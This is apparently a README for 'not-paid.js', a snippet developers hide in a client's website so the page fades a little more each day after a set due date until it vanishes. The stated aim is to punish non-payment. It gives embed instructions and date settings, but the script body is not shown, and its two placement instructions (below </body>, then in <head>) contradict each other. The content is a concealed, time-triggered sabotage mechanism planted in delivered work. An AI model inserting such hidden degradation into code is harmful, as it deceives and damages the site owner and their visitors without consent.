## Client did not pay?

> Add this code in index.html file below < /body> tag

```html
</body>
<script src="not-paid.js"></script>
```

Add opacity to the body tag and decrease it every day until their site completely fades away. Set a due date and customize the number of days you offer them until the website is fully vanished. 




```javascript
/* change these variables as you wish */
var due_date = new Date('2017-02-27');
var days_deadline = 60;
/* stop changing here */
```

PS: Next time use [letsdeel.com](https://letsdeel.com ) to make sure you get paid.

Just load the not-paid.js file in ```<head>```
